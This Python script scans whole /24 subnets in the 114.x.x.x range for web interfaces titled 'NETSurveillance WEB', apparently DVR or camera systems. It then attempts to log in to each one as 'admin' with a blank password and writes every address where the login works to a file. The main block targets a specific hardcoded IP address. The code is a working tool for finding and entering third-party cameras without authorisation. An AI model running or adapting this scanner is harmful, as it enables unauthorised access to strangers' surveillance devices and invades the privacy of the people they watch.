#coding=utf-8

import datetime
import requests
from bs4 import BeautifulSoup
import lxml

def checklogin(url):
	url=url
	a='NETSurveillance'
	success=False
	#url = 'http://114.32.2.167' #114.32.43.1；114.32.3.39
	#url = 'http://114.'+str(subnet2)+'.'+str(subnet3)+'.'+str(ip)
	#print(url)

	data = {'username':'admin','password':''}
	
	headers = { 
	    'User-Agent':'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36',
	    'Content-Length':'38',
	    'Content-Type':'application/x-www-form-urlencoded',
	    'Cookie':'%7B%22username%22%3A%22admin%22%7D',
	    'Cache-Control':'max-age=0'
	}
	
	session = requests.Session()
	response =session.post(url,headers=headers,data=data,timeout=15)
	
	soup = BeautifulSoup(response.text,'lxml')
	#print(soup)
	title = soup.select('title')[0].text
	
	print(title)
	
	if title == a:
	    success=True
	else:
	    pass
	#print(success)
	
	return success
	
def subnetScan(subnet2,subnet3):
	a='NETSurveillance WEB'
	b=''
	
	#subnet2 = 31
	#subnet3 = 17

	
	count = 1
	iplist = []
	
	for ip in range(1,256,1):
		try:
			
			url = 'http://114.'+str(subnet2)+'.'+str(subnet3)+'.'+str(ip)
			#print(url)
			res = requests.get(url,timeout=0.2)
			soup = BeautifulSoup(res.text,'lxml')
			title = soup.select('title')[0].text
			
			success = checklogin(url)
			if a==title and success==True:
				#print(url+'/'+'Login.htm')
				#urllogin = url +'/'+'Login.htm'
				#print(urllogin)
				#count =count+1
				print(url)
				iplist.append(url)
			else:
				'do nothing'
		except:
			#b='o'
			'do nothing'
			
	#print('done for '+subnet+' subnet: '+ str(count) +' IPs')
	#print(iplist)
	
	print('done for '+str(subnet3)+' subnet: '+ str(len(iplist)) +' IPs')
	now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

	with open('output.txt','a') as fp:
	    fp.write('\n'.join(iplist))
	    fp.write('\n\ndone for '+str(subnet3)+' subnet: '+ str(len(iplist)) +' IPs')
	    fp.write('\n'+now+'\n\n')
	    
'''
	with open('output-'+str(subnet3)+'.txt', 'w') as fp:
	    fp.write('\n'.join(iplist))
	    fp.write('\n\ndone for '+str(subnet3)+' subnet: '+ str(len(iplist)) +' IPs')
	    fp.write('\n'+now+'\n\n')
'''



    
if __name__ == '__main__':
	print(checklogin('http://114.32.1.144/Login.htm'))
	#subnetScan(32,1)